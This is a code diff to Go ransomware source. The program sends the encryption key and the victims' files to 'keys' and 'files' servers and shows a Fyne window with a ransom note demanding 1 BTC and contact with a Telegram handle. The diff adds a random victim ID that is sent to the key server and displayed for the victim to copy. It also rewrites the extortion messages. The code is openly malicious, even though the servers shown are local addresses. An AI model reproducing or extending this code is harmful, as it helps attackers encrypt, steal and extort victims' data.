@@ -6,10 +6,12 @@ import (
 	"crypto/rand"
 	"io"
 	"keys"
+	"math/big"
 	"net"
 	"os"
 	"path/filepath"
 	"strconv"
+
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
 	"fyne.io/fyne/v2/data/binding"
@@ -29,12 +31,20 @@ func main() {
 		panic(err)
 	}
 	key := []byte(passwd)
+	id, _ := rand.Int(rand.Reader, big.NewInt(1047483647))
+	ID := id.String()
 	sock, err := net.Dial("tcp", "127.0.0.1:3000") //keys server
 	if err != nil {
 		panic(err)
 	}
 	sock.Write(key)
 	sock.Close()
+	con, err := net.Dial("tcp", "127.0.0.1:3000") //keys server
+	if err != nil {
+		panic(err)
+	}
+	con.Write([]byte(ID))
+	con.Close()
 	for i := 0; i < len(allfiles); i++ {
 		s, err := net.Dial("tcp", "127.0.0.2:3000") //files server
 		if err != nil {
@@ -68,15 +78,15 @@ func main() {
 
 	txtBound := binding.NewString()
 	txtWid := widget.NewLabelWithData(txtBound)
-	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send us 1000 USD to the bitcoin address here and contact us at @...")
+	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send us 1 BTC to this bitcoin address:  after that contact @RealNightKing in Telegram")
 	bottomBox := container.NewHBox(
 		hello,
 		layout.NewSpacer(),
-		widget.NewButtonWithIcon("copy bitcoin address", theme.ContentCopyIcon(), func() {
+		widget.NewButtonWithIcon("Copy your id number and save it is important", theme.ContentCopyIcon(), func() {
 			if content, err := txtBound.Get(); err == nil {
 				myWindow.Clipboard().SetContent(content)
 			}
-			hello.SetText("Don't forget to contact us at @ with your transaction id write this down and Thanks")
+			hello.SetText("Don't forget to pay and contact @RealNightKing in Telegram to get your key")
 		}),
 	)
 
@@ -84,7 +94,7 @@ func main() {
 
 	go func() { // make changing content...
 		for {
-			txtBound.Set("17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR")
+			txtBound.Set(ID)
 		}
 	}()
 	myWindow.SetContent(content)
